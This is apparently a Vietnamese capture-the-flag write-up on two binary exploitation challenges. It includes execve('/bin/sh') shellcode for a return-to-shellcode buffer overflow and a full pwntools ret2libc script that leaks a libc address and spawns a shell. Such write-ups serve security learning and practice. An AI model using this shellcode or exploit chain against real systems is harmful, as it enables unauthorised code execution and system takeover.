 
 
 
### 1. Giftshell
**Tóm tắt đề :**

1 file giftshell để chạy trên linux 

**Ý tưởng:**
- Đầu tiên mình sài IDA để decompile
![](https://i.imgur.com/TBsp4PM.png)
- Nhận thấy có lỗi buffer overflow do biến `buf` khai báo có 112 byte mà nhập tới 128 byte, cùng với việc đề leak địa chỉ biến `buf` ra ở `printf` thì khá chắc chắn là lỗi return to shellcode
- Vậy ta sẽ sử dụng địa chỉ biến `buf` bị leak để ret về đó, từ địa chỉ biến buf trở về sau chính là shell code của ta.
- Do mình lười nên lên mạng chép mã assembly để lấy shell, ở đây mình lên dreamhack để lấy.



    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp  ;
    xor rsi, rsi  ;
    xor rdx, rdx  ; 
    mov rax, 0x3b ;
     syscall ;
    
- Phần padding còn lại mình fill bằng byte `\x90` tức là `nop` trong assembly x86.
- Kế tiếp ta vào gdb để tìm offset cho ret. Ở đây ta được 120. 
![](https://i.imgur.com/9KcRPR0.png)
- Tiếp theo ta tìm số bytes của shellcode. Chạy script dưới ta được số byte là 29.
![](https://i.imgur.com/NPr8ND5.png)
- Do đó thứ tự payload sẽ là 29 byte shellcode, 91 byte nop và cuối cùng là 8 byte địa chỉ để ret vào. Vậy giờ ta sẽ viết script để viết ý tưởng trên. 
![](https://i.imgur.com/zFMHWrS.png)
- Chạy script trên ta đã lấy được shell.

### 2. loveletter
**Tóm tắt đề :**
- 1 file source 
- 1 file dockerfile
- 1 file docker-compose 

**Ý tưởng :**
- Đầu tiên mình decompile bằng IDA.
![](https://i.imgur.com/zflRfBI.png)
- Ta thấy control flow của chương trình như sau : chạy hàm loveletter -> yêu cầu nhập -> chạy hàm doubt -> nếu chọn Y thì sẽ set buffer cho biến `v1`, còn không thì chưa rõ do không khai báo.
- Tới đây ta cần phân tích rõ thứ tự các biến trong stack để coi có ghi đè được biến `v1` không vì khi đó ta sẽ tuỳ ý chọn số byte để nhập.
- Ta nhận thấy biến `v1` của hàm `loveletter` tức là mảng `buff[MAX_BUFFER + 69]` trong source và biến v1 của hàm `doubt` gần nhau. Ta có phân tích như sau:
![](https://i.imgur.com/xxLXtTB.png)
- Khi ta nhập full byte của biến `buf` trong hàm `loveletter` rồi chuyển qua hàm `doubt`, do biến `v1` không khai báo nên sẽ nhận giá trị ở vị trí `rsp+0xC` (stack không clear sau khi thực hiện xong hàm). Ta sẽ lợi dụng điều này để lấy shell.
- Do EX đã tắt và đây là file ELF 64 bit nên ta sẽ làm theo dạng return2libc 64bit
![](https://i.imgur.com/DUobQxU.png)
- Do đây là dạng cơ bản nên ta chỉ cần tìm gadget của từng phần viết script.
![](https://i.imgur.com/4ZQeiY2.png)
- Kết hợp tất cả thông tin rồi ta sẽ viết được script này

'''
    from pwn import *
    
    context.binary = exe = ELF('./main', checksec=False)
    libc = ELF('libc.so.6', checksec=False)
    p = process(exe.path) 
    p.sendafter(b'> ', b'A'*4000) 
    p.sendafter(b'> ', b'A'*2969)
    
    p.recvuntil(b'?\n')
    p.sendafter(b'> ', b'Y')
    payload = b'A'*264
    pop_rdi = 0x00000000004014b3
    payload += p64(pop_rdi) + p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.sym['main'])
    
    p.recvuntil(b'w.\n')
    p.sendafter(b'> ', payload)
    p.recvuntil(b'!\n')
    libc_leak = u64(p.recv(6) + b'\x00\x00')
    libc.address = libc_leak - libc.sym['puts']
    
    p.sendafter(b'> ', b'A'*4000) 
    p.sendafter(b'> ', b'A'*2969)
    p.recvuntil(b'letter?\n')
    p.sendafter(b'> ', b'Y')
    
    ret = 0x000000000040101a
    payload = b'A'*264 + p64(ret)
    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
    payload += p64(libc.sym['system'])
    p.recvuntil(b'now.\n')
    p.sendafter(b'> ', payload)
    p.interactive()
    
'''
- Chạy thử và ta sẽ có được shell.
